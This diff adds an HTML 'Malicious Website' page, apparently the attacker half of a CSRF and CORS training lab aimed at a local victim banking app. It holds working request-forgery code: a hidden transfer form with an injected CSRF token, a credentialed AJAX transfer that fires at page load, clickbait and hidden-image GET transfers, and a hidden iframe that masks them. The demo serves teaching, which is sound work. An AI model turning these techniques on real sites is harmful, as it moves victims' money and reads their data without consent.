@@ -1,0 +1,108 @@
+<html>
+
+<head>
+    <title>Attacker</title>
+    <link href="toastr.min.css" rel="stylesheet"/>
+    <script src="jquery-1.12.2.min.js" type="text/javascript"></script>
+    <script src="toastr.min.js" type="text/javascript"></script>
+</head>
+
+<body style="background: #f8cdcd">
+
+<h1 style="color: red">Malicious Website</h1>
+
+<div style="border:2px solid red; background-color: #fdc2c2">
+    <h2>&lt;form POST = CSRF: Cross Site Request Forging</h2>
+    <form action="http://localhost:8080/api/victim/transfer-form" method="post" target="hiddenIframe">
+        <input name="recipientFullName" type="hidden" value="Attacker"/>
+        <input name="recipientIban" type="hidden" value="ATTACKERIBAN13123"/>
+        <input name="amount" type="hidden" value="100"/>
+        <input type="submit" value="Free Download!">
+
+        <input id="csrfTokenField" name="_csrf" type="hidden"/> <br/>
+    </form>
+    <script>
+        function injectLastCapturedCsrf() {
+            fetch("/csrf/last", {
+                method: "GET"
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Fetched CSRF token:", data.token);
+                    document.getElementById("csrfTokenField").value = data.token;
+                })
+        }
+        injectLastCapturedCsrf();
+    </script>
+</div>
+<br/>
+
+
+<div style="border:2px solid red; background: #fdc2c2">
+    <h2>AJAX via CORS: Cross-Origin Resource Sharing</h2>
+    <input onclick="transferAmount()" type="button" value="Download Free Stuff"><br/>
+    REST API called at page load, if allowed by too broad CORS<br/>
+    <input onclick="getCurrentUser()" type="button" value="Get Current User">
+
+    <script type="text/javascript">
+        function transferAmount() {
+            $.ajax({ //  this js is loaded from :9999 (hacker website),or injected via XSS
+                url: "http://localhost:8080/api/victim/transfer-rest",
+                method: "POST",
+                xhrFields: {withCredentials: true}, // CORS sending credentials
+                data: JSON.stringify({
+                    recipientFullName: "Attacker",
+                    recipientIban: "ATACKERIBAN013213",
+                    amount: "100"
+                }),
+                contentType: "application/json",
+                success: function (trainings) {
+                    toastr.success("Money Transferred")
+                },
+                error: function (error) {
+                    // toastr.error("Failed to Transfer!");
+                }
+            });
+        }
+
+        transferAmount();// automatically at page load
+
+        function getCurrentUser() {
+            $.ajax("http://localhost:8080/api/user/current", {
+                method: "GET",
+                success: function (trainings) {
+                    toastr.success("CORS allows reading data:  " + JSON.stringify(trainings));
+                }
+            });
+        }
+    </script>
+</div>
+<br/>
+
+<div style="border:2px solid red; background: #fdc2c2">
+    <h2>&lt;a href=</h2>
+    <a href="http://localhost:8080/api/victim/transfer-over-get-BAD?recipientFullName=ATTACKER&recipientIban=ABC&amount=100"
+       onclick="catimg.style.display='block'" target="hiddenIframe">Click here to see a lovely cat!</a>
+    <img name="catimg" src="cat.jpg" style="display: none">
+    <p>Click the cat! - click bait: GET is unprotected => should not do any side-effects</p>
+</div>
+<br/>
+
+<div style="border:2px solid red; background: #fdc2c2">
+    <h2>&lt;img src=</h2>
+
+    Truth is, you don't even have to click a link for a GET to be sent (check victim app logs:)
+
+    <h5>To fetch an image on page load, Browser called &gt;img src=bank.com/... using any cookies it has with
+        bank.com</h5>
+    <img src="http://localhost:8080/api/victim/transfer-over-get-BAD?recipientFullName=ATTACKER&recipientIban=ABC&amount=200"
+         style="display: none"/>
+
+</div>
+
+<!-- To keep the user on the same page, the requests to navigate the browser (eg href=)
+ are targeted into a hidden iframe -->
+<iframe id="hiddenIframe" name="hiddenIframe" style="display:none"></iframe>
+
+</body>
+</html>
